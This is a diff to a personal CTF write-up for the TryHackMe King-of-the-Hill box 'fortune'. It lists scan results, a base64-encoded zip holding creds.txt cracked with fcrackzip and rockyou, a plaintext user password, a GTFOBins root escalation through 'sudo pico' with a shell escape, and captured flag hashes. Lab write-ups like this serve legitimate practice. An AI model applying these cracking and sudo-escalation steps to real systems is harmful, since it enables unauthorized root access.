@@ -3,7 +3,7 @@
 THM-KOTH: fortune
 ============================
 
-> labruhtooryboi | December 6, 2020
+> labruhtooryboi | December 16, 2020
 
 # 10.10.16.30
 # fortune.thm
@@ -99,8 +99,12 @@ PORT      STATE SERVICE    VERSION
 /server-status (Status: 403)
 '''
 
+
+
+
 '''
 (going back to nmap scan)
+(this will change every new instance of the box)
 
 UEsDBAoACQAAAFi+hlE66unrHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAANYbs1fWG7NX3V4CwABBAAAAAAEAAAAAI+oj/zT9LJIQ2uXbup/hmeBnOqxOFtNmYsvS7Kav9NQSwcIOurp6x8AAAATAAAAUEsBAh4DCgAJAAAAWL6GUTrq6esfAAAAEwAAAAkAGAAAAAAAAQAAAKSBAAAAAGNyZWRzLnR4dFVU BQADWG7NX3V4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE8AAAByAAAAAAA=
 '''
@@ -112,6 +116,8 @@ UEsDBAoACQAAAFi+hlE66unrHwAAABMAAAAJABwAY3JlZHMudHh0VVQJAANYbs1fWG7NX3V4CwABBAAA
 application.zip 
 '''
 
+
+(fortuna's passwd will change for every new istance of the box)
 '''
 fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt application.zip 
 
@@ -127,6 +133,8 @@ fortuna:OGYwY2E2MT
 
 
 					# privelage escalation
+					
+					
 (gtfobins)				
 '''
 sudo pico
@@ -138,27 +146,44 @@ reset; sh 1>&0 2>&0
 
 					# interesting things
 
+
+(found 4/8)
 >flags
 '''
-(fortuna desktop/chess)
+/home/fortuna/chess
 7b1ded3f11db0ff3a0deba11f92364c7
 '''
 
 '''
+/geama/flag
+d87728453a7a55bddb8e62b8c3aab359
 '''
+
+'''
+/usr/local/games/flag
+9acf0d33cf153a52d2cc58437424a1ec
+'''
+
+'''
+/usr/games/flag
+3373314cd03e4f4eb267e6e3c3ed0ae1
+'''
+
+
 
 >users
 '''
 fortuna
 hermes
 kairos
-lucky_shell
 tyche
 root
 amechania
 '''
 
 >passwds
+
+(will change)
 '''
 OGYwY2E2MT
 '''
@@ -168,7 +193,7 @@ OGYwY2E2MT
 
 >files and dirs
 '''
-pico
+/usr/bin/pico
 '''
 
 '''
